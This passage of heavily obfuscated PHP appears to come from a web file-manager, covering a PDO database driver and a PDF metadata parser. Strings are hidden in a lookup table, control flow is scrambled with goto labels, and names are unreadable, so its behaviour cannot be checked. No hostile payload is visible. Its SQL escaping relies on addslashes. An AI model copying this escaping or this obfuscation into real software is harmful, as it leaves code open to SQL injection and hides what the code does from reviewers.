164\56\x74\141\x62\154\x65\x5f\156\141\x6d\x65\40\75\x20\143\56\164\x61\x62\x6c\x65\x5f\x6e\141\155\x65\12\x9\x9\127\x48\x45\122\x45\40\40\x20\164\x2e\164\x61\142\154\145\x5f\156\x61\155\x65\x20\75\x20\x27{$bºƒÉŒƒ¹š}\x27"; break; case $Aæµ¸—ÉÄÒ[850]: $Aùˆä×Úœ = $Aæµ¸—ÉÄÒ[851] . $bºƒÉŒƒ¹š . $Aæµ¸—ÉÄÒ[852]; break; case $Aæµ¸—ÉÄÒ[832]: case $Aæµ¸—ÉÄÒ[834]: $Aùˆä×Úœ = $Aæµ¸—ÉÄÒ[853] . $Aæµ¸—ÉÄÒ[854] . $Aæµ¸—ÉÄÒ[855] . strtoupper($bºƒÉŒƒ¹š) . $Aæµ¸—ÉÄÒ[856] . strtoupper($bºƒÉŒƒ¹š) . $Aæµ¸—ÉÄÒ[857]; break; case $Aæµ¸—ÉÄÒ[858]: $Aùˆä×Úœ = $Aæµ¸—ÉÄÒ[859] . $bºƒÉŒƒ¹š . $Aæµ¸—ÉÄÒ[860]; break; case $Aæµ¸—ÉÄÒ[833]: break; case $Aæµ¸—ÉÄÒ[861]: default: $Aùˆä×Úœ = $Aæµ¸—ÉÄÒ[862] . ($this->dbType == $Aæµ¸—ÉÄÒ[861] ? "\x60{$bºƒÉŒƒ¹š}\140" : $bºƒÉŒƒ¹š); } } goto fİÔ‹­½½í; b§Ï‰ªª¬Ö: return $d§×·Ï‰™ö; goto a»îÁŒ½ì©; fİÔ‹­½½í: $FÓÊœº›å = $this->query($Aùˆä×Úœ); $d§×·Ï‰™ö = array(); if ($FÓÊœº›å) { foreach ($FÓÊœº›å as $e°²âîÉ => $E„«‰óÅ‘±) { $E„«‰óÅ‘± = array_change_key_case($E„«‰óÅ‘±); $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[28]] = isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[28]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[28]] : $Aæµ¸—ÉÄÒ[358]; $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[29]] = isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[29]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[29]] : $Aæµ¸—ÉÄÒ[358]; $BãÕÊËÌŠÙ = isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[258]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[258]] : $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[28]]; $d§×·Ï‰™ö[$BãÕÊËÌŠÙ] = array($Aæµ¸—ÉÄÒ[28] => $BãÕÊËÌŠÙ, $Aæµ¸—ÉÄÒ[29] => $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[29]], $Aæµ¸—ÉÄÒ[31] => (bool) (isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[101]]) && $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[101]] === $Aæµ¸—ÉÄÒ[33] || isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[31]]) && $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[31]] === $Aæµ¸—ÉÄÒ[33]), $Aæµ¸—ÉÄÒ[34] => isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[34]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[34]] : (isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[53]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[53]] : $Aæµ¸—ÉÄÒ[358]), $Aæµ¸—ÉÄÒ[36] => isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[89]]) ? strtolower($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[89]]) == $Aæµ¸—ÉÄÒ[38] : (isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[54]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[54]] : !1), $Aæµ¸—ÉÄÒ[39] => isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[863]]) ? strtolower($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[863]]) == $Aæµ¸—ÉÄÒ[41] : (isset($E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[89]]) ? $E„«‰óÅ‘±[$Aæµ¸—ÉÄÒ[89]] : !1)); } } goto b§Ï‰ªª¬Ö; a»îÁŒ½ì©: } public function getTables($aØ¢è¿©±ë = '') { $A‘®Î–—‘¯ =& $_SERVER[Äº¡•ô™Ÿ]; if (think_config($A‘®Î–—‘¯[864])) { $b¼ãÁ÷“ñ¼ = str_replace($A‘®Î–—‘¯[865], $aØ¢è¿©±ë, think_config($A‘®Î–—‘¯[864])); } else { switch ($this->dbType) { case $A‘®Î–—‘¯[832]: case $A‘®Î–—‘¯[834]: $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[866]; break; case $A‘®Î–—‘¯[831]: case $A‘®Î–—‘¯[849]: $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[867]; break; case $A‘®Î–—‘¯[858]: $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[868]; break; case $A‘®Î–—‘¯[833]: think_exception(think_lang($A‘®Î–—‘¯[869]) . $A‘®Î–—‘¯[870]); break; case $A‘®Î–—‘¯[850]: $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[42] . $A‘®Î–—‘¯[43] . $A‘®Î–—‘¯[44]; break; case $A‘®Î–—‘¯[861]: default: if (!empty($aØ¢è¿©±ë)) { $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[814] . $aØ¢è¿©±ë; } else { $b¼ãÁ÷“ñ¼ = $A‘®Î–—‘¯[815]; } } } $EÕË÷ñ = $this->query($b¼ãÁ÷“ñ¼); $eëÃîÅ¤·ª = array(); foreach ($EÕË÷ñ as $eÊ¡æÅ²öù => $dãä¿œÅ—) { $eëÃîÅ¤·ª[$eÊ¡æÅ²öù] = current($dãä¿œÅ—); } return $eëÃîÅ¤·ª; } protected function parseLimit($E°ã‹åŠŠ®) { $bÖ²¢¬ñç =& $_SERVER[Äº¡•ô™Ÿ]; $E±£˜ÆìºÈ = $bÖ²¢¬ñç[33]; if (!empty($E°ã‹åŠŠ®)) { switch ($this->dbType) { case $bÖ²¢¬ñç[858]: case $bÖ²¢¬ñç[850]: $E°ã‹åŠŠ® = explode($bÖ²¢¬ñç[47], $E°ã‹åŠŠ®); if (count($E°ã‹åŠŠ®) > 1) { $E±£˜ÆìºÈ .= $bÖ²¢¬ñç[48] . $E°ã‹åŠŠ®[1] . $bÖ²¢¬ñç[49] . $E°ã‹åŠŠ®[0] . $bÖ²¢¬ñç[50]; } else { $E±£˜ÆìºÈ .= $bÖ²¢¬ñç[48] . $E°ã‹åŠŠ®[0] . $bÖ²¢¬ñç[50]; } break; case $bÖ²¢¬ñç[831]: case $bÖ²¢¬ñç[849]: break; case $bÖ²¢¬ñç[833]: break; case $bÖ²¢¬ñç[832]: case $bÖ²¢¬ñç[834]: break; case $bÖ²¢¬ñç[861]: default: $E±£˜ÆìºÈ .= $bÖ²¢¬ñç[48] . $E°ã‹åŠŠ® . $bÖ²¢¬ñç[50]; } } return $E±£˜ÆìºÈ; } public function parseKey(&$Cç”÷œÁÉ, $c’ƒÏò¥İõ = true) { $b©±½÷îˆ =& $_SERVER[Äº¡•ô™Ÿ]; if ($c’ƒÏò¥İõ) { $Cç”÷œÁÉ = $this->parseKeyCheck($Cç”÷œÁÉ); } if ($this->dbType == $b©±½÷îˆ[861]) { if ($Cç”÷œÁÉ != $b©±½÷îˆ[173] && !preg_match($b©±½÷îˆ[825], $Cç”÷œÁÉ)) { $Cç”÷œÁÉ = $b©±½÷îˆ[826] . trim($Cç”÷œÁÉ, $b©±½÷îˆ[826]) . $b©±½÷îˆ[826]; } return $Cç”÷œÁÉ; } else { return parent::parseKey($Cç”÷œÁÉ); } } public function close() { $this->_linkID = null; } public function error() { $D„âÉØäÛ… =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->PDOStatement) { $a¥àˆİ…»÷ = $this->PDOStatement->errorInfo(); $this->error = $a¥àˆİ…»÷[1] . $D„âÉØäÛ…[4] . $a¥àˆİ…»÷[2]; } else { $this->error = $D„âÉØäÛ…[33]; } if ($D„âÉØäÛ…[33] != $this->queryStr) { $this->error .= LNG($D„âÉØäÛ…[45]) . $this->queryStr; } think_trace($this->error, $D„âÉØäÛ…[33], $D„âÉØäÛ…[46]); return $this->error; } public function escapeString($d³­Ï¸§à²) { $BÇ‚…³é´ª =& $_SERVER[Äº¡•ô™Ÿ]; switch ($this->dbType) { case $BÇ‚…³é´ª[858]: case $BÇ‚…³é´ª[831]: case $BÇ‚…³é´ª[849]: case $BÇ‚…³é´ª[861]: return addslashes($d³­Ï¸§à²); case $BÇ‚…³é´ª[833]: case $BÇ‚…³é´ª[850]: case $BÇ‚…³é´ª[832]: case $BÇ‚…³é´ª[834]: return str_ireplace($BÇ‚…³é´ª[55], $BÇ‚…³é´ª[56], $d³­Ï¸§à²); } } protected function parseValue($dŞ×ŠáåÂÙ) { $có ”òéÊ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_string($dŞ×ŠáåÂÙ)) { $dŞ×ŠáåÂÙ = strpos($dŞ×ŠáåÂÙ, $có ”òéÊ[4]) === 0 ? $this->escapeString($dŞ×ŠáåÂÙ) : $có ”òéÊ[871] . $this->escapeString($dŞ×ŠáåÂÙ) . $có ”òéÊ[871]; } elseif (isset($dŞ×ŠáåÂÙ[0]) && is_string($dŞ×ŠáåÂÙ[0]) && strtolower($dŞ×ŠáåÂÙ[0]) == $có ”òéÊ[282]) { $dŞ×ŠáåÂÙ = $this->escapeString($dŞ×ŠáåÂÙ[1]); } elseif (is_array($dŞ×ŠáåÂÙ)) { $dŞ×ŠáåÂÙ = array_map(array($this, $có ”òéÊ[872]), $dŞ×ŠáåÂÙ); } elseif (is_bool($dŞ×ŠáåÂÙ)) { $dŞ×ŠáåÂÙ = $dŞ×ŠáåÂÙ ? $có ”òéÊ[83] : $có ”òéÊ[464]; } elseif (is_null($dŞ×ŠáåÂÙ)) { $dŞ×ŠáåÂÙ = $có ”òéÊ[101]; } return $dŞ×ŠáåÂÙ; } public function getLastInsertId() { $Døø§ˆ‚õÙ =& $_SERVER[Äº¡•ô™Ÿ]; switch ($this->dbType) { case $Døø§ˆ‚õÙ[858]: case $Døø§ˆ‚õÙ[850]: case $Døø§ˆ‚õÙ[831]: case $Døø§ˆ‚õÙ[849]: case $Døø§ˆ‚õÙ[833]: case $Døø§ˆ‚õÙ[861]: return $this->_linkID->lastInsertId(); case $Døø§ˆ‚õÙ[832]: case $Døø§ˆ‚õÙ[834]: $a¯Òòï‰ÛÊ = $this->table; $Aò­É–Öò‘ = $this->query("\123\x45\x4c\105\x43\124\40{$a¯Òòï‰ÛÊ}\x2e\143\165\x72\162\x76\141\x6c\x20\x63\x75\162\162\x76\141\154\x20\106\x52\117\115\40\144\165\x61\x6c"); return $Aò­É–Öò‘ ? $Aò­É–Öò‘[0][$Døø§ˆ‚õÙ[873]] : 0; } } } goto e·ÂÀªšÄ‰; Bí…‘âõ¥Ÿ: class FileParsePdf { public static function parse($C¹‰·”»Ôí) { goto dğßÁ¶ø³; CË”¡£äà: $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1508]] = StreamWrapperIO::read($C¹‰·”»Ôí, 0, $B„Æö”òà); $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1509]] = StreamWrapperIO::read($C¹‰·”»Ôí, $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[77]] - $B„Æö”òà, $B„Æö”òà); $b¸¨Ş‚Œœ = self::decodeXref($cĞæíæ§Ÿ¦); goto aïë„ÏïÈ; cİ¿¶†‡·: $EÛÃàâÂ…– = $Bëº›×ÕÎ[1512]; preg_match($EÛÃàâÂ…–, $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1508]], $cÎ’Íò”ÑË); if (!$e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1511]] && count($cÎ’Íò”ÑË) == 5) { $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1511]] = $cÎ’Íò”ÑË[3]; $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1513]] = $cÎ’Íò”ÑË[4]; } goto E®ôÑíÒ¸¿; E®ôÑíÒ¸¿: preg_match($EÛÃàâÂ…–, $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1509]], $cÎ’Íò”ÑË); if (!$e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1511]] && count($cÎ’Íò”ÑË) == 5) { $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1511]] = $cÎ’Íò”ÑË[3]; $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1513]] = $cÎ’Íò”ÑË[4]; } preg_match($Bëº›×ÕÎ[1514], $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1508]], $cÎ’Íò”ÑË); goto câ®‹¦…À ; DÜîä²ã–â: if ($cÎ’Íò”ÑË[1] && $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1515]] < $cÎ’Íò”ÑË[1][0]) { $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1515]] = $cÎ’Íò”ÑË[1][0]; } $e¦ØßÓÖ„‘ = self::parseInfoItem($e¦ØßÓÖ„‘); return $e¦ØßÓÖ„‘; goto eĞ¯òÌ­Õ; dğßÁ¶ø³: $Bëº›×ÕÎ =& $_SERVER[Äº¡•ô™Ÿ]; $B„Æö”òà = 32 * 1024; $cĞæíæ§Ÿ¦ = array($Bëº›×ÕÎ[778] => fopen($C¹‰·”»Ôí, $Bëº›×ÕÎ[1162]), $Bëº›×ÕÎ[75] => $C¹‰·”»Ôí, $Bëº›×ÕÎ[77] => filesize($C¹‰·”»Ôí), $Bëº›×ÕÎ[1507] => $B„Æö”òà); goto CË”¡£äà; aïë„ÏïÈ: if ($b¸¨Ş‚Œœ) { $D”³‚Æ¢èË = $b¸¨Ş‚Œœ[$Bëº›×ÕÎ[1510]][$Bëº›×ÕÎ[1184]]; $e¦ØßÓÖ„‘ = self::getObjectValue($cĞæíæ§Ÿ¦, $b¸¨Ş‚Œœ, $D”³‚Æ¢èË); } $e¦ØßÓÖ„‘ = is_array($e¦ØßÓÖ„‘) ? $e¦ØßÓÖ„‘ : array(); $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1511]] = 0; goto cİ¿¶†‡·; A†‰ÇåÍ: preg_match_all($EÛÃàâÂ…–, $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1508]], $cÎ’Íò”ÑË); if ($cÎ’Íò”ÑË[1] && $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1515]] < $cÎ’Íò”ÑË[1][0]) { $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1515]] = $cÎ’Íò”ÑË[1][0]; } preg_match_all($EÛÃàâÂ…–, $cĞæíæ§Ÿ¦[$Bëº›×ÕÎ[1509]], $cÎ’Íò”ÑË); goto DÜîä²ã–â; câ®‹¦…À : if ($cÎ’Íò”ÑË) { $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1320]] = $cÎ’Íò”ÑË[1]; } $e¦ØßÓÖ„‘[$Bëº›×ÕÎ[1515]] = 0; $EÛÃàâÂ…– = $Bëº›×ÕÎ[1516]; goto A†‰ÇåÍ; eĞ¯òÌ­Õ: } private static function parseInfoItem($F„ô†É‚Ï) { $aÜ Á‚µº =& $_SERVER[Äº¡•ô™Ÿ]; if (!$F„ô†É‚Ï) { return !1; } $BÌ™”œ¬á« = array($aÜ Á‚µº[1321] => array($aÜ Á‚µº[1517], $aÜ Á‚µº[33]), $aÜ Á‚µº[1518] => array($aÜ Á‚µº[1519], $aÜ Á‚µº[33]), $aÜ Á‚µº[184] => array($aÜ Á‚µº[1520], $aÜ Á‚µº[207]), $aÜ Á‚µº[107] => array($aÜ Á‚µº[1521], $aÜ Á‚µº[207]), $aÜ Á‚µº[1515] => array($aÜ Á‚µº[1515], $aÜ Á‚µº[273]), $aÜ Á‚µº[1511] => array($aÜ Á‚µº[1511], $aÜ Á‚µº[273]), $aÜ Á‚µº[1513] => array($aÜ Á‚µº[1513], $aÜ Á‚µº[273]), $aÜ Á‚µº[1522] => array($aÜ Á‚µº[1523], $aÜ Á‚µº[33]), $aÜ Á‚µº[1524] => array($aÜ Á‚µº[1525], $aÜ Á‚µº[33]), $aÜ Á‚µº[1526] => array($aÜ Á‚µº[1320], $aÜ Á‚µº[33])); $BŒÌ–ÕÚ Ÿ = array(); foreach ($BÌ™”œ¬á« as $aÉö‘¡ˆ„ã => $CÉÅŒ‹Ã) { if (!isset($F„ô†É‚Ï[$CÉÅŒ‹Ã[0]])) { continue; } $d¡Ú¿ï›™Š = $F„ô†É‚Ï[$CÉÅŒ‹Ã[0]]; if (!$d¡Ú¿ï›™Š || is_array($d¡Ú¿ï›™Š)) { continue; } switch ($CÉÅŒ‹Ã[1]) { case $aÜ Á‚µº[273]: $d¡Ú¿ï›™Š = intval($d¡Ú¿ï›™Š); break; case $aÜ Á‚µº[207]: if (substr($d¡Ú¿ï›™Š, 0, 2) == $aÜ Á‚µº[1527]) { $d¡Ú¿ï›™Š = substr($d¡Ú¿ï›™Š, 2, 14); } if (strtotime($d¡Ú¿ï›™Š)) { $d¡Ú¿ï›™Š = date($aÜ Á‚µº[1528], strtotime($d¡Ú¿ï›™Š)); } break; } $BŒÌ–ÕÚ Ÿ[$aÉö‘¡ˆ„ã] = $d¡Ú¿ï›™Š; } return $BŒÌ–ÕÚ Ÿ; } private static function decodeXref(&$b´ÈñÉÆ°) { goto E·ˆä……£; eËÇÃáÅÅ„: if (preg_match($dƒÊ¼Í‚×˜[1536], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[77]] = intval($B‚šöŸÄÜµ[1]); } if (preg_match($dƒÊ¼Í‚×˜[1537], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[1538]] = intval($B‚šöŸÄÜµ[1]) . $dƒÊ¼Í‚×˜[70] . intval($B‚šöŸÄÜµ[2]); } if (preg_match($dƒÊ¼Í‚×˜[1539], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[1540]] = intval($B‚šöŸÄÜµ[1]) . $dƒÊ¼Í‚×˜[70] . intval($B‚šöŸÄÜµ[2]); } goto fçõÎê¸¤£; d ©‘ÑØĞâ: foreach ($B‚šöŸÄÜµ[3] as $c‰áÓ‹Âè± => $FÜõ‘œõÆİ) { if ($B‚šöŸÄÜµ[3][$c‰áÓ‹Âè±] == $dƒÊ¼Í‚×˜[1532]) { $aé¡ÃàË”Å = $aÌáÏÕÀÙ . $dƒÊ¼Í‚×˜[70] . intval($B‚šöŸÄÜµ[2][$c‰áÓ‹Âè±]); $bš™é›Ìà[$dƒÊ¼Í‚×˜[1529]][$aé¡ÃàË”Å] = intval($B‚šöŸÄÜµ[1][$c‰áÓ‹Âè±]); ++$aÌáÏÕÀÙ; } else { if ($B‚šöŸÄÜµ[3][$c‰áÓ‹Âè±] == $dƒÊ¼Í‚×˜[1533]) { ++$aÌáÏÕÀÙ; } else { } } } if (preg_match_all($dƒÊ¼Í‚×˜[1534], $dÌóÛ¬™ø, $B‚šöŸÄÜµ)) { $E‘£õ˜¾¾ö = $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[77]] - $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1507]]; foreach ($B‚šöŸÄÜµ[0] as $c‰áÓ‹Âè± => $dŒÈÑ…ö±Ã) { $CÄáà¢Úœ÷ = $B‚šöŸÄÜµ[1][$c‰áÓ‹Âè±] . $dƒÊ¼Í‚×˜[70] . $B‚šöŸÄÜµ[2][$c‰áÓ‹Âè±]; $bš™é›Ìà[$dƒÊ¼Í‚×˜[1529]][$CÄáà¢Úœ÷] = strpos($dÌóÛ¬™ø, $dŒÈÑ…ö±Ã) + $E‘£õ˜¾¾ö + 1; } } if (preg_match_all($dƒÊ¼Í‚×˜[1535], $dÌóÛ¬™ø, $B‚šöŸÄÜµ)) { $A²‘ĞªòÎö = count($B‚šöŸÄÜµ[1]) == 1 ? $B‚šöŸÄÜµ[1][0] : $B‚šöŸÄÜµ[1][1]; } else { $A²‘ĞªòÎö = substr($dÌóÛ¬™ø, -1024 * 5); } goto eËÇÃáÅÅ„; BÔŞ¡¯ïç®: if ($b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[77]] - $f¯Û«ºâÆÎ > $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1507]]) { $Eìßíê‰øÓ = 4 * $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1507]]; $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1507]] = $Eìßíê‰øÓ; $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1508]] = StreamWrapperIO::read($b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[75]], 0, $Eìßíê‰øÓ); $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1509]] = StreamWrapperIO::read($b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[75]], $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[77]] - $Eìßíê‰øÓ, $Eìßíê‰øÓ); $dÌóÛ¬™ø = $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1509]]; } $aÌáÏÕÀÙ = 0; preg_match_all($dƒÊ¼Í‚×˜[1531], $dÌóÛ¬™ø, $B‚šöŸÄÜµ); goto d ©‘ÑØĞâ; fçõÎê¸¤£: if (preg_match($dƒÊ¼Í‚×˜[1541], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[1184]] = intval($B‚šöŸÄÜµ[1]) . $dƒÊ¼Í‚×˜[70] . intval($B‚šöŸÄÜµ[2]); } if (preg_match($dƒÊ¼Í‚×˜[1542], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[364]] = array(); $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[364]][0] = $B‚šöŸÄÜµ[1]; $bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[364]][1] = $B‚šöŸÄÜµ[2]; } if (!$bš™é›Ìà[$dƒÊ¼Í‚×˜[1510]][$dƒÊ¼Í‚×˜[1184]]) { return !1; } goto Dô™¼œª—±; E·ˆä……£: $dƒÊ¼Í‚×˜ =& $_SERVER[Äº¡•ô™Ÿ]; $dÌóÛ¬™ø = $b´ÈñÉÆ°[$dƒÊ¼Í‚×˜[1509]]; $bš™é›Ìà = array($dƒÊ¼Í‚×˜[1510] => array(), $dƒÊ¼Í‚×˜[1529] => array()); goto dÜã‚Ğ®ßÇ; Dô™¼œª—±: if (preg_match($dƒÊ¼Í‚×˜[1543], $A²‘ĞªòÎö, $B‚šöŸÄÜµ) > 0) { } return $bš™é›Ìà; goto f‚Šœî§¨§; dÜã‚Ğ®ßÇ: $a÷×Ñô„„¨ = $dƒÊ¼Í‚×˜[1530]; if (!preg_match_all($a÷×Ñô„„¨, $dÌóÛ¬™ø, $B‚šöŸÄÜµ, PREG_SET_ORDER, 0)) { return !1; } $f¯Û«ºâÆÎ = intval($B‚šöŸÄÜµ[0][1]); goto BÔŞ¡¯ïç®; f‚Šœî§¨§: } private static function getObjectValue($EÆ½÷Š›ì†, $Cßó‹»‰ÎÇ, $cÀ½³Š™â) { goto DÙ½ØñÉ®; DÙ½ØñÉ®: $f‡¨íÓ•êå =& $_SERVER[Äº¡•ô™Ÿ]; $F´Æ½áì‚ô = self::getObject($EÆ½÷Š›ì†, $Cßó‹»‰ÎÇ[$f‡¨íÓ•êå[1529]][$cÀ½³Š™â]); if (is_string($F´Æ½áì‚ô[1])) { return $F´Æ½áì‚ô[1]; } goto bíŒî…ÔòÅ; FÄßâÌ¦ƒ: return $B®êÚ¤Ä¤‚; goto a’¤Œ‰‹ÊÅ; bíŒî…ÔòÅ: if (!is_array($F´Æ½áì‚ô[1])) { return array(); } $B®êÚ¤Ä¤‚ = array(); for ($e¬ÙÕÛô’ = 0; $e¬ÙÕÛô’ < count($F´Æ½áì‚ô[1]); $e¬ÙÕÛô’ += 2) { $b˜ Ç­Ø¥» = $F´Æ½áì‚ô[1][$e¬ÙÕÛô’]; $EÛ‰–‘ÄÖó = $F´Æ½áì‚ô[1][$e¬ÙÕÛô’ + 1]; if (count($b˜ Ç­Ø¥») == 3 && $b˜ Ç­Ø¥»[0] == $f‡¨íÓ•êå[8]) { $cé¨ÙªØÈø = !1; if ($EÛ‰–‘ÄÖó[0] == $f‡¨íÓ•êå[1544]) { $EÛ‰–‘ÄÖó = self::getObject($EÆ½÷Š›ì†, $Cßó‹»‰ÎÇ[$f‡¨íÓ•êå[1529]][$EÛ‰–‘ÄÖó[1]]); } $cé¨ÙªØÈø = $EÛ‰–‘ÄÖó[1]; if ($cé¨ÙªØÈø === !1) { continue; } if (is_string($cé¨ÙªØÈø)) { $cé¨ÙªØÈø = self::decodeStr($cé¨ÙªØÈø); } $B®êÚ¤Ä¤‚[$b˜ Ç­Ø¥»[1]] = $cé¨ÙªØÈø; } } goto FÄßâÌ¦ƒ; a’¤Œ‰‹ÊÅ: } private static function getObject($C“ê¦½ÇÑ, $E †ğ¹¹Ì) { $EÈ—ÁÛªÌç = self::getObjectItem($C“ê¦½ÇÑ, $E †ğ¹¹Ì); $EÈ—ÁÛªÌç = self::getObjectItem($C“ê¦½ÇÑ, $EÈ—ÁÛªÌç[2]); return $EÈ—ÁÛªÌç; } private static function getObjectItem($c‡Ğ¸ÀŠØ, $b‡‘èİçĞ) { goto F£‰ôœâ¯…; fÑŠè°òª: $dÉ„ÂÇ¸¹æ = $b‡‘èİçĞ >= $f–ÁĞ¯‹Ó ? $b‡‘èİçĞ - $f–ÁĞ¯‹Ó : $b‡‘èİçĞ; $b±¾Êõ©Ç¶ = $b‡‘èİçĞ >= $f–ÁĞ¯‹Ó ? $c‡Ğ¸ÀŠØ[$f³ÓÑŒ‚¼[1509]] : $c‡Ğ¸ÀŠØ[$f³ÓÑŒ‚¼[1508]]; if ($b‡‘èİçĞ > $f‰’ø°¥Ş‹ && $b‡‘èİçĞ <= $f–ÁĞ¯‹Ó) { $dÉ„ÂÇ¸¹æ = 0; $b±¾Êõ©Ç¶ = StreamWrapperIO::read($c‡Ğ¸ÀŠØ[$f³ÓÑŒ‚¼[75]], $b‡‘èİçĞ, $f‰’ø°¥Ş‹); } goto aïƒİ†öã; F£‰ôœâ¯…: $f³ÓÑŒ‚¼ =& $_SERVER[Äº¡•ô™Ÿ]; $f‰’ø°¥Ş‹ = $c‡Ğ¸ÀŠØ[$f³ÓÑŒ‚¼[1507]]; $f–ÁĞ¯‹Ó = $c‡Ğ¸ÀŠØ[$f³ÓÑŒ‚¼[77]] - $f‰’ø°¥Ş‹; goto fÑŠè°òª; aïƒİ†öã: $b´¼¯õ¥¨ = self::getRawObject($b±¾Êõ©Ç¶, $dÉ„ÂÇ¸¹æ); if ($b‡‘èİçĞ >= $f–ÁĞ¯‹Ó) { $b´¼¯õ¥¨[2] = $b´¼¯õ¥¨[2] + $f–ÁĞ¯‹Ó; } else { if ($b‡‘èİçĞ > $f‰’ø°¥Ş‹ && $b‡‘èİçĞ <= $f–ÁĞ¯‹Ó) { $b´¼¯õ¥¨[2] = $b´¼¯õ¥¨[2] + $b‡‘èİçĞ; } } return $b´¼¯õ¥¨; goto cöìš ·†Œ; cöìš ·†Œ: } private static function decodeStr($e£Ùóô„†´) { goto D²Õ¸à½÷; b¾æÕˆ¸‰¿: $e£Ùóô„†´ = $CŠì–°ĞØ¶[33]; foreach ($cãí¯¯¬ as $eéÉ‘‰ÓÆó) { if (preg_match($CŠì–°ĞØ¶[1556], $eéÉ‘‰ÓÆó)) { $e£Ùóô„†´ .= \chr(hexdec(trim($eéÉ‘‰ÓÆó, $CŠì–°ĞØ¶[1557]))); } else { $e£Ùóô„†´ .= $eéÉ‘‰ÓÆó; } } $cãí¯¯¬ = preg_split($CŠì–°ĞØ¶[1558], $e£Ùóô„†´, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A½ßœÀ÷Î; C™Ôœ£Ö°„: $e£Ùóô„†´ = $CŠì–°ĞØ¶[33]; foreach ($cãí¯¯¬ as $eéÉ‘‰ÓÆó) { if (preg_match($CŠì–°ĞØ¶[1554], $eéÉ‘‰ÓÆó)) { $e£Ùóô„†´ .= \chr(octdec(trim($eéÉ‘‰ÓÆó, $CŠì–°ĞØ¶[95]))); } else { $e£Ùóô„†´ .= $eéÉ‘‰ÓÆó; } } $cãí¯¯¬ = preg_split($CŠì–°ĞØ¶[1555], $e£Ùóô„†´, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b¾æÕˆ¸‰¿; dÖÌÚÏà‰Í: return $e£Ùóô„†´; goto cìÁ“¦¾ÀØ; A½ßœÀ÷Î: $e£Ùóô„†´ = $CŠì–°ĞØ¶[33]; foreach 